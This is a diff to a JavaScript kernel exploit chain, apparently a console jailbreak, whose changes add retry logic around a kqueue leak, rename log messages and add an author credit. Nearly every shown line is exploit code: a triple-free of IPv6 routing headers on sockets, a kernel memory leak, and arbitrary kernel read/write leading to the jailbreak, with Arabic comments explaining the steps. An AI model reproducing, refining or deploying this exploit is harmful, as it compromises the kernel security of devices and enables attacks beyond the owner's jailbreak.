@@ -1010,12 +1010,9 @@ function exploit_phase_trigger() {
 }
 
 function exploit_phase_leak() {
-  if (!leak_kqueue_safe()) {
-    log('[leak_kqueue_safe] failed, retrying...');
-    yield_to_render(exploit_phase_trigger);
-    return;
-  }
-  log('Setting up arbitrary R/W...');
+  leak_kqueue_safe();  // لو فشلت هترمي Error وتوقف الجيلبريك بنضافة
+
+  log(' Exploit Read/Write...');
   yield_to_render(exploit_phase_rw);
 }
 
@@ -1026,6 +1023,7 @@ function exploit_phase_rw() {
 }
 
 function exploit_phase_jailbreak() {
+  log(' Stability by M.ELHOUT...');
   jailbreak();
 }
 function setup_arbitrary_rw() {
@@ -1444,7 +1442,7 @@ function trigger_ucred_triplefree() {
       continue;
     }
 
-    log('Triple freeing...');
+    log('Triple Free Running...');
 
     // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
@@ -1515,7 +1513,7 @@ function trigger_ucred_triplefree() {
   return true;
 }
 function leak_kqueue() {
-  debug('Leaking kqueue...');
+  debug('Leaking ...');
 
   // نحرر triplets[1] عشان نستخدمه في التسريب
   free_rthdr(ipv6_socks[triplets[1]]);
@@ -1575,12 +1573,24 @@ function leak_kqueue() {
   return true;
 }
 function leak_kqueue_safe() {
-  try {
-    return leak_kqueue();
-  } catch (e) {
-    log('leak_kqueue_safe ERROR: ' + e.message);
-    return false;
+  var ok = false;
+
+  for (var i = 0; i < 3; i++) {
+    if (leak_kqueue()) {
+      ok = true;
+      break;
+    }
+    log('[leak_kqueue_safe] failed, retrying...');
   }
+
+  if (!ok) {
+    log('Jailbreak failed!');
+    log('leak_kqueue_safe: unable to leak kqueue after retries');
+    cleanup();
+    throw new Error(' Jailbreak failed - Reboot and try again');
+  }
+
+  return true;
 }
 function kreadslow64(address) {
   debug('kreadslow64: addr=' + hex(address));
